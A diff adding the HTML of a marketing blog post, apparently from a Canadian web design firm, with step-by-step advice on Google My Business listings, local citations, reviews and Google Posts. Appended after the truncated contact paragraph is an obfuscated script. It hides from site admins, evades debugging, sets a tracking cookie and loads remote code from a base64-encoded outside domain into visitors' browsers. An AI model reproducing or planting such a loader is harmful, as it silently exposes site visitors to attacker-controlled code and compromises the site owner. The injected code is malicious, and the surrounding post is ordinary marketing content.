+<p>Local SEO mainly focuses on attracting quality customers in smaller areas in a particular city. Most local companies generally practice this to reach this audience to get to their physical location or develop business in a service field.</p>
+
+<h2 class="wp-block-heading" id="h-advantage-of-google-my-business-listings-in-local-seo"><strong>Advantage of Google My Business Listings in Local SEO</strong></h2>
+
+<ul>
+<li>Creates online visibility through local SEO activities such as citation building</li>
+
+<li>Optimal online visibility in local areas indicates more traffic, more customers, and more sales</li>
+
+<li>Integrating your local search site offers more specific traffic for particular search keywords</li>
+
+<li>Optimizing Google My Business can lead to enhanced visibility of Google Maps</li>
+
+<li>GMB also improves the relevance of content marketing and link building</li>
+
+<li>Reputation management creates brand authority that can increase online exposure and generate more revenue.</li>
+</ul>
+
+<div style="height:34px" aria-hidden="true" class="wp-block-spacer"></div>
+
+<h2 class="wp-block-heading" id="h-a-step-by-step-guide-on-how-to-register-in-google-my-business"><strong>A step-by-step guide on how to register in Google My Business</strong></h2>
+
+<p>Go to <a href="https://www.google.com/business/">Google My Business</a> and follow the steps below:</p>
+
+<p><strong>1. Have a google account to use for your GMB</strong></p>
+
+<p><strong>2. Put your business name.</strong></p>
+
+<p><strong>3. Select the most relevant business category.</strong></p>
+
+<p><strong>4. Current Business address.</strong></p>
+
+<p><strong>5. List down service areas.</strong></p>
+
+<p><strong>6. Input your phone number and current website URL</strong></p>
+
+<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+https://youtu.be/bp8CHE9Gr9s
+</div></figure>
+
+<h2 class="wp-block-heading" id="h-google-my-business-listing-optimization"><strong>Google My Business Listing Optimization</strong></h2>
+
+<p>To optimize the GMB listing, make sure your primary category is correct. However, you need also to utilize the secondary categories. Do not lose the chance to reach a greater audience. Here are some points to remember (Most of the changes are done within the "Info" tab):</p>
+
+<p>1. Double check your business address, website URL, and phone number.</p>
+
+<p>2. Indicate your actual business hours</p>
+
+<p>3. Input certain products you sell to your clients.</p>
+
+<p>4. Write down every single service you do.</p>
+
+<p>5. Indicate when you started a business.</p>
+
+<p>6. Add photos for your logo, primary picture, and cover photo.&nbsp;</p>
+
+<p>7. Upload a marketing video. Make it short yet educational.</p>
+
+<p>8. Set up messaging on your phone.</p>
+
+<h2 class="wp-block-heading" id="h-geotagging-your-images"><strong>Geotagging Your Images</strong></h2>
+
+<p>Geotagging is the process of adding geographical identification data to media, such as pictures or videos. Google automatically knows the location where you took the picture because it's geotagged.&nbsp;</p>
+
+<h2 class="wp-block-heading" id="h-how-do-you-do-this"><strong><em>How do you do this?</em></strong></h2>
+
+<h2 class="wp-block-heading" id="h-local-citations"><strong>Local Citations</strong></h2>
+
+<p>This is where you punch in your company name, street address, and postal code and then select Canada. You'll then see genuine citations that you need to either fix or add. Here are some samples for citations:</p>
+
+<ul>
+<li><a href="http://www.yellowpages.ca">www.yellowpages.ca</a></li>
+
+<li><a href="http://www.canpages.ca">www.canpages.ca</a></li>
+
+<li><a href="http://www.bbb.org">www.bbb.org</a></li>
+
+<li><a href="http://www.manta.com">www.manta.com</a></li>
+
+<li><a href="http://www.yelp.ca">www.yelp.ca</a></li>
+
+<li><a href="http://www.angieslist.com">www.angieslist.com</a></li>
+
+<li><a href="http://www.facebook.com">www.facebook.com</a></li>
+
+<li><a href="http://www.houzz.com">www.houzz.com</a></li>
+
+<li><a href="http://www.homeadvisor.com">www.homeadvisor.com</a></li>
+
+<li><a href="http://www.yellowpages.com">www.yellowpages.com</a></li>
+</ul>
+
+<p>Here is a fantastic tool provided by <a href="https://moz.com/checkout/local/check.%20But%20if%20you%20want%20to%20take%20it%20to%20the%20next%20level,%20head%20over%20to%20whitespark:%20https://whitespark.ca/best-citations-by-category/canada/">Moz</a>. But if you want to take it to the next level, head over to Whitespark.</p>
+
+<p>Many other smaller directories may be locally popular. To find those, you can try searching by city: Calgary. It would be best to start on the more prominent websites, as the smaller directory websites often get data from the more prominent directory websites.</p>
+
+<h2 class="wp-block-heading" id="h-on-page-gmb-optimization"><strong>On-Page GMB Optimization</strong></h2>
+
+<p>Having clean and organic on-page content on the website helps your GMB rankings. Here, it would help if you assured the following:</p>
+
+<p>● Business Name, Address, and Phone number (NAP)</p>
+
+<p>● Provide a Google Map link to the office</p>
+
+<p>● Business hours (as what was indicated on Google Map)</p>
+
+<p>● Have a section list in "Business Name – Service Area – Review Websites" format (e.g., LandscapingPro – Barrie – Review Websites)</p>
+
+<p>● Include reviews from your websites (e.g., YouTube, Facebook, TrustedPros, etc.)</p>
+
+<p>● Have a section called "proudly servicing these areas."</p>
+
+<p>● Make a YouTube video.</p>
+
+<p>For some more detailed insights:</p>
+
+<p>● Ensure your website is <a href="https://search.google.com/test/mobile-friendly">mobile-friendly.</a></p>
+
+<p>● Ensure your website is <a href="https://developers.google.com/speed/pagespeed/insights/">loading fast</a>.</p>
+
+<h2 class="wp-block-heading" id="h-google-reviews"><strong>Google Reviews</strong></h2>
+
+<p>They want to see what your last customer said about you. Hence, it would help if you always got reviews. Reviews from last year or further back won't be good enough to really close the deal. It would be best if you had a consistent incoming flow of great reviews every single week, as it's a great indicator for Google to rank your listing higher on the search engine.&nbsp;</p>
+
+<p><em><strong>Why are reviews critical?</strong></em></p>
+
+<p>Reviews serve as your company's credibility that gains customers' trust and encourages them to do business with you. Also, it will help you improve your business' profit. To generate a review form, go here. Then, go to <em>bit </em>and shorten the URL and send it to your client by text after your service call.</p>
+
+<h2 class="wp-block-heading" id="h-google-posts"><strong>Google Posts</strong></h2>
+
+<p>It's important to post consistently because this is one of the factors that optimized your GMB. Check out the eight tips for your Google Post:&nbsp;</p>
+
+<p>1. <strong>Post Quality Visuals&nbsp;</strong></p>
+
+<p>2. <strong>Post Videos</strong>&nbsp;</p>
+
+<p>3. <strong>Add a Call to Action to Google Posts&nbsp;</strong></p>
+
+<p>4. <strong>Post At Least Once Per Week</strong>&nbsp;</p>
+
+<p>5. <strong>First 50 Characters Are Quality</strong>&nbsp;</p>
+
+<p>6. <strong>Use Keywords in Post Description</strong></p>
+
+<p>7. <strong>Study Analytics</strong>&nbsp;</p>
+
+<p>8. <strong>Schedule Posts Ahead</strong>&nbsp;</p>
+
+<h2 class="wp-block-heading" id="h-hire-the-best-digital-marketing-for-your-home-service-business"><strong>Hire the best digital marketing for your home service business</strong></h2>
+
+<p>Talk to our professional digital manager now. Give us a call at <a href="tel:" data-type="tel" data-id="tel:">647-492-5513</a> or send an email at <a href="mailto:amir@canadianwebedsigns.ca">amir@canadianwebedsigns.ca</a> to get your free quotations. You can also leave your inquiry by</p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
